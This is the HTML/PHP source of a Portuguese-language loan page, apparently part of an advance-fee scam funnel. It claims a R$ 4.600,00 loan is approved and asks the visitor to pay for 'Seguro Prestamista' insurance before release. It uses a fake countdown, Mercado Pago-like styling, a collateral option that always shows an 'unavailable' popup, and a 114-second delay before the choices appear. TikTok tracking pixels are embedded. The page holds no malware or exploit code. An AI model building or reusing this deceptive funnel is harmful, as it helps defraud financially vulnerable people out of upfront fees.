<!DOCTYPE html>
<html lang="pt-BR">
<head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Seguro Prestamista</title>


<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>
<script>
  window.tikTokPixelId = "6917a5ff97e4b1e2a6541a7a";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
  document.head.appendChild(a);
</script>
<!-- TikTok Pixel Code Start -->
<script>
!function (w, d, t) {
  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};


  ttq.load('D4BQAE3C77UD6NKP6AK0');
  ttq.page();
}(window, document, 'ttq');
</script>
<!-- TikTok Pixel Code End -->



    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'mp-blue': '#009EE3',
                        'mp-dark-blue': '#0074A8',
                        'mp-light-blue': '#E6F7FF',
                    }
                }
            }
        }
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

        * {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        main {
            flex: 1;
        }

        .fade-in {
            animation: fadeIn 0.5s ease-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(15px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.02); }
        }

        .animate-pulse-custom {
            animation: pulse 2s infinite;
        }
    </style>
</head>
<body class="bg-gray-50">
    <?php include 'header.php'; ?>

    <main class="py-8 px-4 md:py-12">
        <div class="max-w-3xl mx-auto">
            <div class="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 md:p-8 fade-in">
                <div class="text-center mb-6">
                    <div class="bg-amber-50 border border-amber-200 rounded-lg px-4 py-2 inline-block mb-4">
                        <span class="text-amber-800 font-semibold text-sm">Oferta válida por: <span class="text-red-600 text-lg font-bold" id="countdown">30:00</span></span>
                    </div>
                    <h1 class="text-2xl md:text-3xl font-bold text-gray-900 mb-2">Última etapa para liberar seu empréstimo</h1>
                    <div class="text-3xl font-bold text-mp-blue mb-4 animate-pulse-custom" id="valorAprovado">
                        Valor aprovado: R$ 4.600,00
                    </div>
                </div>

                <div class="bg-mp-light-blue border-l-4 border-mp-blue rounded-lg p-6 mb-6">
                    <div class="flex items-start gap-3 mb-4">
                        <svg class="w-6 h-6 text-mp-blue flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"/>
                        </svg>
                        <div>
                            <h3 class="text-lg font-semibold text-gray-900 mb-2">
                                Por que solicitamos o Seguro Prestamista?
                            </h3>
                            <p class="text-gray-700 text-sm mb-3">
                                Essa proteção garante que seu empréstimo seja quitado mesmo em casos de:
                            </p>
                            <div class="flex flex-wrap gap-2 mb-3">
                                <span class="bg-white text-gray-700 border border-gray-300 px-3 py-1 rounded-full text-xs font-medium">
                                    Perda de renda
                                </span>
                                <span class="bg-white text-gray-700 border border-gray-300 px-3 py-1 rounded-full text-xs font-medium">
                                    Acidente
                                </span>
                                <span class="bg-white text-gray-700 border border-gray-300 px-3 py-1 rounded-full text-xs font-medium">
                                    Invalidez
                                </span>
                            </div>
                            <div class="space-y-2 text-gray-700 text-sm">
                                <div class="flex items-start gap-2">
                                    <svg class="w-4 h-4 text-green-600 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
                                    </svg>
                                    <span>Depósito em 5 minutos após o pagamento</span>
                                </div>
                                <div class="flex items-start gap-2">
                                    <svg class="w-4 h-4 text-green-600 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
                                    </svg>
                                    <span>Valor abatido da primeira parcela</span>
                                </div>
                                <div class="flex items-start gap-2">
                                    <svg class="w-4 h-4 text-green-600 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
                                    </svg>
                                    <span>Sem necessidade de apresentar bens como garantia</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="mb-6">
                    <div class="bg-gray-100 rounded-xl overflow-hidden relative">

                       <vturb-smartplayer id="vid-68ffd5e8818c013eeb42f70a" style="display: block; margin: 0 auto; width: 100%; max-width: 400px;"></vturb-smartplayer> <script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/550d6c62-1165-49ef-96ff-1ad5f309f49a/players/68ffd5e8818c013eeb42f70a/v4/player.js", s.async=!0,document.head.appendChild(s); </script>
                    </div>
                </div>

                <div class="bg-amber-50 border border-amber-300 rounded-lg p-4 text-center text-amber-900 text-sm font-medium mb-6">
                    Caso opte por não contratar o seguro, será necessário apresentar um bem como garantia.
                </div>

                <div id="optionsSection" class="space-y-4 opacity-0 invisible transition-all duration-500">
                    <h3 class="text-xl font-semibold text-gray-900 text-center mb-4" id="tituloOpcoes">
                        Escolha uma das opções abaixo:
                    </h3>

                    <div id="opcao1" class="border-2 border-mp-blue bg-gradient-to-r from-mp-light-blue to-green-50 rounded-xl p-6">
                        <div class="flex items-center justify-between mb-4">
                            <h4 class="text-lg font-semibold text-gray-900">Seguro Prestamista</h4>
                            <span class="bg-mp-blue text-white px-3 py-1 rounded-full text-xs font-bold">
                                Recomendado
                            </span>
                        </div>
                        <ul class="space-y-2 mb-5 text-sm text-gray-700">
                            <li class="flex items-center gap-2">
                                <svg class="w-4 h-4 text-green-600 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
                                </svg>
                                Liberação imediata e valor total
                            </li>
                            <li class="flex items-center gap-2">
                                <svg class="w-4 h-4 text-green-600 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
                                </svg>
                                Vinculado à fatura do cartão
                            </li>
                            <li class="flex items-center gap-2">
                                <svg class="w-4 h-4 text-green-600 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
                                </svg>
                                Proteção completa contra imprevistos
                            </li>
                        </ul>
                        <button id="next-btn" onclick="simularAcao(this)"
                                class="w-full bg-mp-blue text-white py-3.5 rounded-lg font-semibold hover:bg-mp-dark-blue hover:shadow-lg transition-all">
                            Selecionar esta opção
                        </button>
                        <div id="success-message" class="hidden bg-green-50 border-2 border-green-500 text-green-700 p-3 rounded-lg text-center font-semibold mt-3">
                            Solicitação registrada com sucesso! Redirecionando...
                        </div>
                    </div>

                    <div id="opcao2" class="border-2 border-gray-200 rounded-xl p-6">
                        <h4 class="text-lg font-semibold text-gray-900 mb-4">Entregar Veículo ou Imóvel como garantia</h4>
                        <ul class="space-y-2 mb-5 text-sm text-gray-700">
                            <li class="flex items-center gap-2">
                                <svg class="w-4 h-4 text-gray-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-11a1 1 0 10-2 0v2H7a1 1 0 100 2h2v2a1 1 0 102 0v-2h2a1 1 0 100-2h-2V7z" clip-rule="evenodd"/>
                                </svg>
                                Inclusão presencial do bem
                            </li>
                            <li class="flex items-center gap-2">
                                <svg class="w-4 h-4 text-gray-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-11a1 1 0 10-2 0v2H7a1 1 0 100 2h2v2a1 1 0 102 0v-2h2a1 1 0 100-2h-2V7z" clip-rule="evenodd"/>
                                </svg>
                                Liberação em até 5 dias úteis
                            </li>
                            <li class="flex items-center gap-2">
                                <svg class="w-4 h-4 text-gray-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-11a1 1 0 10-2 0v2H7a1 1 0 100 2h2v2a1 1 0 102 0v-2h2a1 1 0 100-2h-2V7z" clip-rule="evenodd"/>
                                </svg>
                                Documentação adicional necessária
                            </li>
                        </ul>
                        <button onclick="simularGarantia(this)"
                                class="w-full bg-gray-600 text-white py-3.5 rounded-lg font-semibold hover:bg-gray-700 transition-all">
                            Selecionar esta opção
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <div id="popup" class="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4 opacity-0 invisible transition-all duration-300">
        <div class="bg-white rounded-2xl p-8 max-w-sm w-full text-center transform scale-90 transition-all duration-300">
            <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg class="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
                </svg>
            </div>
            <h3 class="text-2xl font-bold text-gray-900 mb-3">Opção Indisponível</h3>
            <p class="text-gray-600 mb-6 leading-relaxed">
                No momento, esta opção está temporariamente desativada para manutenção. Por favor, selecione a opção recomendada.
            </p>
            <button onclick="closePopup()"
                    class="w-full bg-mp-blue text-white py-3 rounded-lg font-semibold hover:bg-mp-dark-blue transition-all">
                Entendi
            </button>
        </div>
    </div>

    <?php include 'footer.php'; ?>

    <script>
        let optionsShown = false;

        document.addEventListener("DOMContentLoaded", function() {
            initCountdown();

            // Mostra as opções após 5 segundos automaticamente
            setTimeout(() => {
                showOptions();
            }, 114000);
        });

        function showOptions() {
            if (!optionsShown) {
                const optionsSection = document.getElementById('optionsSection');
                optionsSection.classList.remove('opacity-0', 'invisible');
                optionsShown = true;

                // Scroll suave até as opções após aparecerem
                setTimeout(() => {
                    optionsSection.scrollIntoView({
                        behavior: 'smooth',
                        block: 'center'
                    });
                }, 300);
            }
        }

        function initCountdown() {
            let tempoRestante = 1800;
            const countdownEl = document.getElementById('countdown');
            const countdown = setInterval(() => {
                tempoRestante--;
                const minutos = Math.floor(tempoRestante / 60);
                const segundos = tempoRestante % 60;
                countdownEl.textContent = `${minutos}:${segundos < 10 ? '0' : ''}${segundos}`;
                if (tempoRestante <= 0) {
                    clearInterval(countdown);
                    countdownEl.textContent = 'EXPIRADO';
                }
            }, 1000);
        }

        function simularAcao(botao) {
            const successMessage = document.getElementById('success-message');
            botao.innerHTML = '<svg class="animate-spin h-5 w-5 mx-auto" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>';
            botao.disabled = true;

            setTimeout(() => {
                successMessage.classList.remove('hidden');
                botao.innerHTML = 'Selecionado';
                botao.classList.remove('bg-mp-blue', 'hover:bg-mp-dark-blue');
                botao.classList.add('bg-green-600', 'hover:bg-green-700');
                const urlParams = new URLSearchParams(window.location.search);
                setTimeout(() => {
                    window.location.href = `10.php?${urlParams.toString()}`;
                }, 2000);
            }, 1500);
        }

        function simularGarantia(botao) {
            const popup = document.getElementById('popup');
            popup.classList.remove('opacity-0', 'invisible');
            popup.querySelector('.bg-white').classList.remove('scale-90');
            popup.querySelector('.bg-white').classList.add('scale-100');
        }

        function closePopup() {
            const popup = document.getElementById('popup');
            popup.querySelector('.bg-white').classList.remove('scale-100');
            popup.querySelector('.bg-white').classList.add('scale-90');
            setTimeout(() => {
                popup.classList.add('opacity-0', 'invisible');
            }, 300);
        }
    </script>
</body>
</html>
